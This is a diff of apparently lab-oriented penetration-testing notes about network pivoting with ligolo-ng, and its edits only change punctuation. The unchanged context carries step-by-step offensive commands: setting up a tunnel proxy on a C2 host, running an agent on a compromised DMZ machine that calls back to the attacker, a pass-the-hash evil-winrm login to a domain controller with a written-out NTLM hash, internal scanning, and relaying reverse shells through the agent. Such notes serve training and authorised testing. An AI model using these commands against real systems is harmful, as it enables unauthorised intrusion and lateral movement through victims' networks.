@@ -1,5 +1,5 @@
 # Download the files
-Worth checking the current tag before pulling these — ligolo-ng ships often and this goes stale fast. v0.8.3 is current as of this writing.
+Worth checking the current tag before pulling these: ligolo-ng ships often and this goes stale fast. v0.8.3 is current as of this writing.
 ## Agent File:
 ```
 sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_agent_0.8.3_linux_amd64.tar.gz
@@ -22,7 +22,7 @@ sudo mv proxy lin-proxy
 ```
 # Ligolo-ng
 ## Attack Host
-These commands create a tun interface on the Proxy Server (C2). Worth noting up front why this setup step exists at all — chisel and socat never touch routing, so neither needs root/CAP_NET_ADMIN on either end. Ligolo does, because what we're building here is a real interface, not just a forwarded port.
+These commands create a tun interface on the Proxy Server (C2). Worth noting up front why this setup step exists at all: chisel and socat never touch routing, so neither needs root/CAP_NET_ADMIN on either end. Ligolo does, because what we're building here is a real interface, not just a forwarded port.
 ```
 sudo ip tuntap add user root mode tun ligolo
 ```
@@ -36,7 +36,7 @@ sudo ip link set ligolo up
 ```
 ./lin-proxy -selfcert -laddr 0.0.0.0:443 
 ```
-2. Before sending the agent anywhere, grab the cert fingerprint from the proxy console — copy what it prints, we'll hand it to the agent next instead of making it trust the connection blind:
+2. Before sending the agent anywhere, grab the cert fingerprint from the proxy console: copy what it prints, we'll hand it to the agent next instead of making it trust the connection blind:
 ```
 ligolo-ng » certificate_fingerprint
 ```
@@ -48,7 +48,7 @@ chmod +x lin-agent
 ```
 ./lin-agent -connect 10.10.14.74:11601 -accept-fingerprint 3f:8a:1c:9e:22:47:b6:d0:5a:e1:73:c4:88:0f:36:d9:a2:5b:e7:14:f8:63:29:ab:d4:70:1e:9c:55:8b:02:6f
 ```
-(`-ignore-cert` still works if it's a closed lab and we don't care about the wire — no real reason not to just pin the fingerprint though, now that we have it.)
+(`-ignore-cert` still works if it's a closed lab and we don't care about the wire, but no real reason not to just pin the fingerprint though, now that we have it.)
 **If the DMZ host can't reach us at all** (outbound filtered, only inbound allowed on a specific port), flip it around instead of fighting the firewall. On the DMZ host: `./lin-agent -bind 0.0.0.0:11601`. Then we connect out to it from the proxy console:
 ```
 ligolo-ng » connect_agent --ip 172.16.8.120:11601
@@ -72,16 +72,16 @@ ligolo-ng » session
 evil-winrm -i 172.16.8.3 -u administrator -H fd1f7e5564060258ea787ddbb6e6afa2
 ```
 ## Reaching a Port Bound to the Agent's Own Loopback
-While poking around the DMZ host we spot a service listening on 127.0.0.1 only — nothing on the `172.16.8.0/24` route we already added reaches it, because it's not actually on that network, it's local to the agent itself. Ligolo has a magic CIDR for exactly this, `240.0.0.0/4`, that gets redirected straight to whichever agent's session is active:
+While poking around the DMZ host we spot a service listening on 127.0.0.1 only. Nothing on the `172.16.8.0/24` route we already added reaches it, because it's not actually on that network, it's local to the agent itself. Ligolo has a magic CIDR for exactly this, `240.0.0.0/4`, that gets redirected straight to whichever agent's session is active:
 ```
 sudo ip route add 240.0.0.1/32 dev ligolo
 ```
 ```
 nmap -sV 240.0.0.1
 ```
-This is one of the spots where ligolo actually saves us work over chisel or socat — either of those would've needed an explicit forward set up the moment we noticed the loopback-only service. Here the route we already had is general enough to just catch it.
-## Listener — Relaying a Port Back Through the Agent
-`listener_add` shows up again in the Double Pivoting walkthrough below, but it's worth understanding on its own first, because it isn't just a double-pivot trick — it opens a listening socket on the **agent's** side of the tunnel and relays whatever connects to it back to an address our proxy can reach. Useful any time something can only reach the DMZ host and not us directly — catching a reverse shell from a third segment, for example:
+This is one of the spots where ligolo actually saves us work over chisel or socat: either of those would've needed an explicit forward set up the moment we noticed the loopback-only service. Here the route we already had is general enough to just catch it.
+## Listener: Relaying a Port Back Through the Agent
+`listener_add` shows up again in the Double Pivoting walkthrough below, but it's worth understanding on its own first, because it isn't just a double-pivot trick: it opens a listening socket on the **agent's** side of the tunnel and relays whatever connects to it back to an address our proxy can reach. Useful any time something can only reach the DMZ host and not us directly, catching a reverse shell from a third segment, for example:
 ```
 ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
 ```
@@ -91,7 +91,7 @@ ligolo-ng » listener_list
 ```
 ligolo-ng » listener_stop 0
 ```
-With a `nc -lvnp 4444` (or an MSF handler) running locally against `127.0.0.1:4444`, anything that hits the DMZ host on port 4444 lands in our listener. The Double Pivoting section below is one applied use of this exact feature — a listener catching the second agent's connection instead of a reverse shell.
+With a `nc -lvnp 4444` (or an MSF handler) running locally against `127.0.0.1:4444`, anything that hits the DMZ host on port 4444 lands in our listener. The Double Pivoting section below is one applied use of this exact feature: a listener catching the second agent's connection instead of a reverse shell.
 # Double Pivoting
 To Double Pivot and access the Ubuntu Host (only accessible from Windows Machine DC) we need to have a ligolo session from the Windows DC host (172.16.8.3)
 ## Attack Host
